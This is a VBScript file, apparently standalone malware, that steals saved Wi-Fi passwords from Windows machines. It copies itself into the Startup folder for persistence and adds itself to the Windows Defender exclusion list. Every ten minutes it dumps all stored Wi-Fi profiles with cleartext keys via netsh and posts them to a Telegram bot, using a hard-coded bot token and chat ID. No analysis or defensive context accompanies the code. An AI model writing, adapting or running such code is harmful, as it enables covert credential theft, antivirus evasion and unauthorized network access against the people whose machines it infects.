Dim objShell, objExec, objHTTP
Dim wifiProfiles, profile, command, result, message
Dim botToken, chatID, apiURL
Dim startupFolder, scriptPath

botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc"  
chatID = "5792222595"      
apiURL = "https://api.telegram.org/bot" & botToken & "/sendMessage"

Set objShell = CreateObject("WScript.Shell")

startupFolder = objShell.SpecialFolders("Startup")
scriptPath = WScript.ScriptFullName
If Not FileExists(startupFolder & "\" & WScript.ScriptName) Then
    objShell.Run "cmd /c copy """ & scriptPath & """ """ & startupFolder & "\"""", 0, False
End If

On Error Resume Next
objShell.Run "powershell -Command Add-MpPreference -ExclusionPath """ & scriptPath & """", 0, False
On Error GoTo 0

Do While True
    Set objExec = objShell.Exec("cmd /c netsh wlan show profiles")
    wifiProfiles = objExec.StdOut.ReadAll()

    message = "🔍 Wi-Fi Credentials Dump 🔍" & vbCrLf & vbCrLf
    For Each profile In Split(wifiProfiles, vbCrLf)
        If InStr(profile, "All User Profile") > 0 Then
            profile = Trim(Split(profile, ":")(1))

            command = "cmd /c netsh wlan show profile name=""" & profile & """ key=clear"
            Set objExec = objShell.Exec(command)
            result = objExec.StdOut.ReadAll()
            
            If InStr(result, "Key Content") > 0 Then
                keyContent = Trim(Split(Split(result, "Key Content")(1), ":")(1))
            Else
                keyContent = "N/A"
            End If
            
            message = message & "📡 *Network:* " & profile & "" & vbCrLf
            message = message & "🔑 *Password:* " & keyContent & "" & vbCrLf
            message = message & "------------------------------" & vbCrLf
        End If
    Next

    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "POST", apiURL, False
    objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    objHTTP.Send "chat_id=" & chatID & "&text=" & message & "&parse_mode=Markdown"

    Set objExec = Nothing
    Set objHTTP = Nothing

    WScript.Sleep 600000
Loop

Function FileExists(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    FileExists = fso.FileExists(filePath)
    Set fso = Nothing
End Function